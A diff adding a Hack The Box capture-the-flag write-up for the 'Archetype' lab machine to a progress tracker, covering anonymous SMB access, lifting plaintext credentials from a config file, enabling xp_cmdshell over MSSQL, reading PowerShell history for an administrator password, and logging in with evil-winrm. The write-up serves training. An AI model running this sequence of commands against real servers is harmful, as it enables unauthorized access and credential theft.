@@ -1,5 +1,377 @@
 # ![Hack The Box](https://img.shields.io/badge/-Hack%20The%20Box-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black) HTB Starting Point — Progress Tracker
 
+### 📊 Tier 2 Progress
+
+| Machine | Tier | Services | Date Completed | Write-Up |
+|---------|------|----------|----------------|----------|
+| **Archetype** | 2 | SMB (445), MSSQL (1433), WinRM (5985) | 2026-04-04 | [↓ Jump to Archetype](#htb-starting-point-archetype) |
+| **Oopsie** | 2 | HTTP (80), SSH (22) | — | — |
+| **Vaccine** | 2 | FTP (21), HTTP (80), SSH (22) | — | — |
+| **Unified** | 2 | HTTP (8080/8443), SSH (22) | — | — |
+
+---
+
+> **Tier 2 Progress:** 1/4 machines completed (25%)  
+> **Next:** Oopsie  
+> **Last Updated:** April 4, 2026
+
+---
+
+# HTB Starting Point: Archetype
+
+## MSSQL Exploitation → xp_cmdshell → PowerShell History → Privilege Escalation
+
+| System Detail | Information |
+|---------------|-------------|
+| Machine Name | Archetype |
+| Difficulty | Starting Point (Tier 2) |
+| Target IP | 10.129.82.155 |
+| Completion Date | April 04, 2026 |
+
+## 📋 Table of Contents
+
+- [Reconnaissance](#reconnaissance)
+- [SMB Enumeration](#smb-enumeration)
+- [MSSQL Exploitation](#mssql-exploitation)
+- [Privilege Escalation](#privilege-escalation)
+- [Flag Capture](#flag-capture)
+- [Questions & Answers](#questions--answers)
+- [Quick Reference](#quick-reference)
+- [Troubleshooting](#troubleshooting)
+- [Lessons Learned](#lessons-learned)
+
+## 💻 Environment Setup
+
+| Component | Specification |
+|-----------|---------------|
+| Attack Machine | Kali Linux (2024.x) |
+| Connectivity | OpenVPN (HTB Lab Configuration) |
+| Tools Used | Nmap, smbclient, mssqlclient-ng, pymssql, evil-winrm, impacket |
+
+> **Note:** Ensure your HTB VPN is active and you can ping the target IP before beginning enumeration.
+
+---
+
+### 🔍 Phase 1: Reconnaissance
+
+#### Initial Port Scan
+
+Discovery reveals key services: SMB (445), MSSQL (1433), and WinRM (5985).
+
+```bash
+# Discovery scan
+sudo nmap -p- --min-rate 1000 10.129.82.155
+
+# Service versioning
+sudo nmap -sC -sV -p 135,139,445,1433,5985 10.129.82.155
+
+PORT     STATE SERVICE      VERSION
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+```
+
+---
+
+### 📂 Phase 2: SMB Enumeration
+**List Available SMB Shares**
+```bash
+smbclient -L //10.129.82.155 -N
+```
+
+**Output:**
+```bash
+
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+backups         Disk      
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+
+    [!IMPORTANT]
+    The backups share is non-administrative (no $ suffix) and accessible without credentials.
+```
+#### Connect and Download Configuration File
+```bash
+# Connect to the backups share
+smbclient //10.129.82.155/backups -N
+
+# Download the configuration file
+smb: \> get prod.dtsConfig
+smb: \> exit
+
+# View the contents
+cat prod.dtsConfig
+
+Extracted Credentials:
+xml
+
+<ConfiguredValue>
+  Data Source=.;
+  Password=M3g4c0rp123;
+  User ID=ARCHETYPE\sql_svc;
+  ...
+</ConfiguredValue>
+
+Credential Type	Value
+Username	ARCHETYPE\sql_svc
+Password	M3g4c0rp123
+```
+
+---
+
+### 🗄️ Phase 3: MSSQL Exploitation
+
+#### ⚠️ ERROR: Connection Timeout
+
+**Initial Attempt (Failed):**
+
+```bash
+impacket-mssqlclient ARCHETYPE/sql_svc@10.129.82.155 -windows-auth
+```
+**Error:**
+```bash
+Encryption required, switching to TLS
+timed out
+```
+#### 🔍 Root Cause Analysis
+
+| Factor | Explanation |
+| :--- | :--- |
+| **TLS Encryption Required** | SQL Server 2017 requires encrypted connections |
+| **OpenSSL 3.0+ on Kali** | Newer OpenSSL versions have SECLEVEL=2 (strict security) |
+| **Legacy Cipher Suites** | Target server uses older TLS ciphers |
+| **Handshake Failure** | OpenSSL rejects legacy ciphers → timeout |
+
+#### ✅ Solution: Use `mssqlclient-ng`
+
+```bash
+# Install mssqlclient-ng
+pipx install mssqlclient-ng
+
+# Connect successfully
+mssqlclient-ng 10.129.82.155 -u 'ARCHETYPE\sql_svc' -p 'M3g4c0rp123' -windows-auth
+```
+**Result: Same timeout error occurred.**
+
+✅ Working Solution: Python with pymssql
+bash
+
+#### Create virtual environment
+```bash
+python3 -m venv ~/pymssql-env
+source ~/pymssql-env/bin/activate
+```
+#### Install pymssql
+```bash
+pip install pymssql
+```
+
+**Connection Script (This Worked):**
+
+```python
+import pymssql
+
+conn = pymssql.connect(
+    server='10.129.82.155',
+    user=r'ARCHETYPE\sql_svc',
+    password='M3g4c0rp123',
+    database='master',
+    autocommit=True  # Critical for RECONFIGURE commands
+)
+```
+**Verification of Successful Connection:**
+```sql
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+```sql
+xp_cmdshell 'whoami'
+```
+**Output:**
+```text
+archetype\sql_svc
+```
+---
+
+### 🔑 Phase 4: Privilege Escalation
+
+#### Locate PowerShell History File
+
+```sql
+xp_cmdshell 'dir "C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"'
+```
+**Read PowerShell History**
+```sql
+xp_cmdshell 'type "C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"'
+```
+**Output:**
+```text
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
+```
+**Success! Administrator Credentials Found:**
+
+- **Username:** `administrator`
+- **Password:** `MEGACORP_4dm1n!!`
+
+#### Capture User Flag
+
+```sql
+xp_cmdshell 'type C:\Users\sql_svc\Desktop\user.txt'
+```
+#### **User Flag:**
+```bash
+HTB{REDACTED}
+```
+
+---
+
+### 👑 Phase 5: Administrator Access & Root Flag
+
+#### Connect via WinRM (Port 5985)
+
+```bash
+evil-winrm -i 10.129.82.155 -u administrator -p 'MEGACORP_4dm1n!!'
+```
+**Capture Root Flag**
+```bash
+type C:\Users\Administrator\Desktop\root.txt
+```
+**Root Flag:**
+```bash
+HTB{REDACTED}
+```
+
+---
+
+
+---
+
+## 💡 Alternative: With a Title and Key Credentials Table
+
+```markdown
+## 📊 Attack Path Summary
+
+```text
+┌─────────────────────────────────────────────────────────────────────────┐
+│ 1. SMB Enumeration                                                      │
+│    └─► Found "backups" share                                           │
+└─────────────────────────────────────────────────────────────────────────┘
+                                    │
+                                    ▼
+┌─────────────────────────────────────────────────────────────────────────┐
+│ 2. Downloaded prod.dtsConfig                                            │
+│    └─► Extracted sql_svc credentials                                   │
+└─────────────────────────────────────────────────────────────────────────┘
+                                    │
+                                    ▼
+┌─────────────────────────────────────────────────────────────────────────┐
+│ 3. MSSQL Connection (Timeout → Fixed with pymssql)                     │
+│    └─► Authenticated as sql_svc                                        │
+└─────────────────────────────────────────────────────────────────────────┘
+                                    │
+                                    ▼
+┌─────────────────────────────────────────────────────────────────────────┐
+│ 4. Enabled xp_cmdshell                                                  │
+│    └─► Gained OS command execution                                     │
+└─────────────────────────────────────────────────────────────────────────┘
+                                    │
+                                    ▼
+┌─────────────────────────────────────────────────────────────────────────┐
+│ 5. Read PowerShell History File                                         │
+│    └─► Found administrator credentials                                 │
+└─────────────────────────────────────────────────────────────────────────┘
+                                    │
+                                    ▼
+┌─────────────────────────────────────────────────────────────────────────┐
+│ 6. Connected via WinRM as Administrator                                 │
+│    └─► SYSTEM access                                                   │
+└─────────────────────────────────────────────────────────────────────────┘
+                                    │
+                                    ▼
+┌─────────────────────────────────────────────────────────────────────────┐
+│ 7. Captured Root Flag                                                   │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+### 🐛 Troubleshooting
+
+| Issue | Solution |
+| :--- | :--- |
+| `impacket-mssqlclient` connection timeout | Use `pymssql` with `autocommit=True` instead |
+| `pip install` externally-managed-environment error | Use Python virtual environments (`python3 -m venv`) |
+| `mssqlclient-ng` also times out | Fall back to `pymssql` Python script |
+| `psexec` hanging at file upload | Use `evil-winrm` (port 5985) or `wmiexec` |
+| `Access is denied` reading root flag | Need full Administrator shell, not just `xp_cmdshell` |
+| `evil-winrm` connection fails | Ensure port 5985 is open and credentials are correct |
+| PowerShell history file not found | Check user profile path: `C:\Users\<USER>\AppData\Roaming\...` |
+| SMB share access denied | Try null session with `-N` flag or anonymous login |
+
+---
+
+## 💡 Lessons Learned
+
+| # | Lesson |
+| :--- | :--- |
+| 1 | **SMB Enumeration** — Always enumerate SMB shares. Non-administrative shares (without `$`) can contain sensitive configuration files with credentials. |
+| 2 | **Configuration Files** — Files like `prod.dtsConfig`, `web.config`, and `unattend.xml` are goldmines for credentials. Never leave them exposed. |
+| 3 | **TLS Compatibility** — Older Windows services (MSSQL 2017) may have TLS compatibility issues with modern OpenSSL. `pymssql` with `autocommit=True` successfully bypassed this issue. |
+| 4 | **PowerShell History** — PowerShell saves command history by default at `ConsoleHost_history.txt`. Users often type passwords directly in commands, making this a critical post-exploitation target. |
+| 5 | **xp_cmdshell** — If enabled, this MSSQL stored procedure allows OS command execution and is a powerful privilege escalation vector. Always check if it's enabled or can be enabled. |
+| 6 | **Multiple Access Methods** — If `psexec` fails, alternative methods like WinRM (port 5985) or WMI often work. Always check for open management ports. |
+| 7 | **Virtual Environments** — Use `python3 -m venv` to avoid Kali's externally-managed-environment errors when installing Python packages. |
+| 8 | **Credential Reuse** — The same credentials pattern (`MEGACORP_4dm1n!!`) suggests password reuse across services. Always check for reused credentials. |
+| 9 | **WinRM for Remote Access** — Port 5985 (WinRM) is often overlooked but provides a clean PowerShell shell as seen with `evil-winrm`. |
+| 10 | **Always Check User Directories** — User desktops, documents, and AppData folders often contain flags and sensitive information. |
+
+---
+
+## 🔗 Resources
+
+- [Impacket Documentation](https://github.com/fortra/impacket) — MSSQL, SMB, and Windows exploitation tools
+- [pymssql Documentation](https://pymssql.readthedocs.io/) — Python MSSQL driver
+- [evil-winrm](https://github.com/Hackplayers/evil-winrm) — WinRM shell for Windows remote management
+- [PowerShell PSReadLine](https://docs.microsoft.com/en-us/powershell/module/psreadline/) — PowerShell history documentation
+- [xp_cmdshell Documentation](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql) — Microsoft official documentation
+- [smbclient Manual](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) — SMB command-line client
+
+---
+
+## 🏷️ Tags
+
+`#htb` `#archetype` `#smb` `#mssql` `#xp_cmdshell` `#powershell-history` `#privilege-escalation` `#winrm` `#evil-winrm` `#impacket` `#tls-timeout` `#pymssql` `#windows-exploitation`
+
+---
+
+## 🏁 Flags Captured
+
+| Flag | Location | Value |
+| :--- | :--- | :--- |
+| **User Flag** | `C:\Users\sql_svc\Desktop\user.txt` | `HTB{REDACTED}` |
+| **Root Flag** | `C:\Users\Administrator\Desktop\root.txt` | `HTB{REDACTED}` |
+
+---
+
+<div align="center">
+  
+**Machine Completed** ✅
+
+*Last Updated: April 4, 2026*
+
+</div>
+
+---
+
+# ![Hack The Box](https://img.shields.io/badge/-Hack%20The%20Box-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black) HTB Starting Point — Progress Tracker
+
 | Machine | Tier | Services | Date Completed | Write-Up |
 |---------|------|----------|----------------|----------|
 | **Sequel** | 1 | MySQL/MariaDB (3306) | 2026-03-25 | [↓ Jump to Sequel](#htb-starting-point-sequel-mysqlmariadb) |
